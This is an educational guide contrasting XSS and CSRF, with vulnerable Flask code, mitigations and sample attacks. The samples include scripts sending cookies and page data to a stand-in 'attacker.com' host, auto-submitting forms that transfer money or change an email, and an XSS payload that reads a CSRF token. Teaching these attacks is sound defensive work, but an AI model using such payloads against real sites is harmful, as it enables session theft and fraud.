# XSS vs CSRF - Comprehensive Comparison Guide

---

## **Introduction**

XSS (Cross-Site Scripting) and CSRF (Cross-Site Request Forgery) are two of the most common web application vulnerabilities. While both involve "cross-site" attacks, they are fundamentally different and require different mitigation strategies.

**Quick Summary:**

- **XSS**: Attacker injects scripts into web pages → executes in victim's browser
- **CSRF**: Attacker tricks victim's browser → submits requests to target site

---

## **What is XSS**

XSS (Cross-Site Scripting) occurs when an application fails to properly encode user-supplied input before including it in HTML output, allowing attackers to inject malicious JavaScript that executes in the victim's browser.

### **Basic Example**

**Vulnerable Code:**

```python
@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<h1>Results for: {query}</h1>"  # XSS!

```

**Attack:**

```
URL: /search?q=<script>alert('XSS')</script>

```

**Result:** Script executes in victim's browser

---

## **What is CSRF**

CSRF (Cross-Site Request Forgery) is an attack that tricks a user's browser into making requests to a web application where the user is authenticated, causing the application to perform actions the user didn't intend.

### **Basic Example**

**Vulnerable Application:**

```python
@app.route('/transfer', methods=['POST'])
def transfer():
    amount = request.form.get('amount')
    to_account = request.form.get('to')
    transfer_money(amount, to_account)  # CSRF!
    return "Transfer successful"

```

**Attack:**

```html
<!-- Attacker's malicious page (evil.com) -->
<form id="transfer" action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('transfer').submit();</script>

```

**Result:** Victim's browser submits transfer request automatically

---

## **Key Differences**

### **1. Attack Goal**

**XSS:**

- **Goal**: Execute malicious scripts in victim's browser
- **Focus**: Code execution in browser context

**CSRF:**

- **Goal**: Trick victim into submitting requests
- **Focus**: Unauthorized actions on server

---

### **2. What They Exploit**

**XSS:**

- **Exploits**: Trust application has in user input
- **Target**: Application's output encoding

**CSRF:**

- **Exploits**: Trust browser has in application (automatic cookie sending)
- **Target**: Application's request validation

---

### **3. Execution Location**

**XSS:**

- **Location**: Victim's browser
- **Execution**: Client-side JavaScript

**CSRF:**

- **Location**: Server-side
- **Execution**: Server processes request

---

### **4. Attack Vector**

**XSS:**

- **Vector**: Script injection
- **Payload**: JavaScript code
- **Entry**: User input fields, URL parameters, etc.

**CSRF:**

- **Vector**: Form submission
- **Payload**: HTTP request
- **Entry**: Malicious website visited by victim

---

### **5. Target Audience**

**XSS:**

- **Target**: Other users viewing the page
- **Scope**: Can affect multiple users
- **Persistence**: Can be stored (stored XSS)

**CSRF:**

- **Target**: Authenticated users (usually the victim themselves)
- **Scope**: Affects individual user's session
- **Persistence**: One-time attack per victim

---

### **6. Requirements**

**XSS:**

- **Requires**: User input reflected/stored in page
- **Doesn't Require**: User authentication (can affect anonymous users)

**CSRF:**

- **Requires**: User authentication (session cookie)
- **Doesn't Require**: XSS vulnerability

---

### **7. Mitigation**

**XSS:**

- **Primary**: Output encoding
- **Secondary**: Content Security Policy (CSP)
- **Additional**: Input validation, HttpOnly cookies

**CSRF:**

- **Primary**: CSRF tokens
- **Secondary**: SameSite cookies
- **Additional**: Origin/Referer header validation

---

## **Similarities**

### **1. Both are "Cross-Site" Attacks**

**XSS:**

- Attack originates from one site
- Affects another site
- Uses malicious input from attacker

**CSRF:**

- Attack originates from one site (attacker's)
- Affects another site (target)
- Uses victim's browser to make requests

---

### **2. Both Exploit Trust**

**XSS:**

- Exploits application's trust in user input
- Application trusts input is safe

**CSRF:**

- Exploits browser's trust in application
- Browser automatically includes cookies

---

### **3. Both Can Lead to Account Compromise**

**XSS:**

- Steal session cookies
- Hijack user sessions
- Perform actions as user

**CSRF:**

- Perform unauthorized actions
- Change account settings
- Transfer funds, delete data

---

### **4. Both Require Defense in Depth**

**XSS:**

- Multiple layers: encoding, CSP, validation

**CSRF:**

- Multiple layers: tokens, SameSite, headers

---

## **Attack Scenarios Comparison**

### **Scenario 1: Account Takeover**

**XSS Approach:**

```jsx
// Attacker injects script
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

// Result: Attacker steals session cookie

```

**CSRF Approach:**

```html
<!-- Attacker creates malicious form -->
<form action="https://bank.com/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>

// Result: Attacker changes victim's email

```

---

### **Scenario 2: Data Theft**

**XSS Approach:**

```jsx
// Extract data from page
<script>
  var data = document.getElementById('sensitive-data').innerHTML;
  fetch('http://attacker.com/steal?data=' + encodeURIComponent(data));
</script>

```

**CSRF Approach:**

- Cannot directly extract data
- Must perform actions that expose data
- Limited to actions available via forms

---

### **Scenario 3: Unauthorized Actions**

**XSS Approach:**

```jsx
// Perform action via JavaScript
<script>
  fetch('/api/delete', {method: 'POST', body: 'id=123'});
</script>

```

**CSRF Approach:**

```html
<!-- Perform action via form -->
<form action="/api/delete" method="POST">
  <input name="id" value="123">
</form>
<script>document.forms[0].submit();</script>

```

---

## **Mitigation Comparison**

### **XSS Mitigation**

**1. Output Encoding:**

```python
from html import escape

def display_comment(comment):
    return escape(comment)  # HTML encoding

```

**2. Content Security Policy:**

```
Content-Security-Policy: default-src 'self'; script-src 'self'

```

**3. HttpOnly Cookies:**

```
Set-Cookie: session=abc123; HttpOnly; Secure

```

---

### **CSRF Mitigation**

**1. CSRF Tokens:**

```python
@app.route('/transfer', methods=['POST'])
def transfer():
    token = request.form.get('csrf_token')
    if not validate_csrf_token(token):
        return "Invalid CSRF token", 403
    # Process transfer

```

**2. SameSite Cookies:**

```
Set-Cookie: session=abc123; SameSite=Strict; Secure

```

**3. Origin Header Validation:**

```python
if request.headers.get('Origin') != 'https://example.com':
    return "Invalid origin", 403

```

---

## **When They Work Together**

### **Combined Attack: XSS + CSRF**

**Scenario:** XSS vulnerability allows attacker to bypass CSRF protection by reading CSRF token.

**Attack:**

```jsx
// 1. XSS payload reads CSRF token
var csrf_token = document.querySelector('input[name="csrf_token"]').value;

// 2. Use token to perform CSRF attack
fetch('/transfer', {
    method: 'POST',
    body: 'amount=10000&to=attacker&csrf_token=' + csrf_token
});

```

**Mitigation:**

- Prevent XSS (output encoding)
- Use HttpOnly cookies for CSRF tokens
- Additional validation beyond tokens

---

## **Decision Framework**

### **When to Focus on XSS Protection**

**Focus on XSS if:**

- Application displays user input
- User-generated content is shown
- URL parameters reflected in page
- Search functionality exists
- Comment/forum features present

---

### **When to Focus on CSRF Protection**

**Focus on CSRF if:**

- State-changing operations exist
- POST/PUT/DELETE endpoints present
- User authentication required
- Actions change account settings
- Financial transactions possible

---

### **Always Protect Against Both**

**Best Practice:**

- Implement XSS protection (output encoding, CSP)
- Implement CSRF protection (tokens, SameSite)
- Defense in depth approach
- Regular security testing

---

## **Summary**

**XSS and CSRF are different vulnerabilities:**

| Aspect | XSS | CSRF |
| --- | --- | --- |
| **Goal** | Execute scripts | Submit requests |
| **Location** | Browser | Server |
| **Target** | Other users | Authenticated users |
| **Prevention** | Output encoding | CSRF tokens |
| **Requires Auth?** | No | Yes |
| **Attack Vector** | Script injection | Form submission |

**Key Takeaway:** Both vulnerabilities must be addressed with appropriate mitigation strategies. Preventing one does not prevent the other.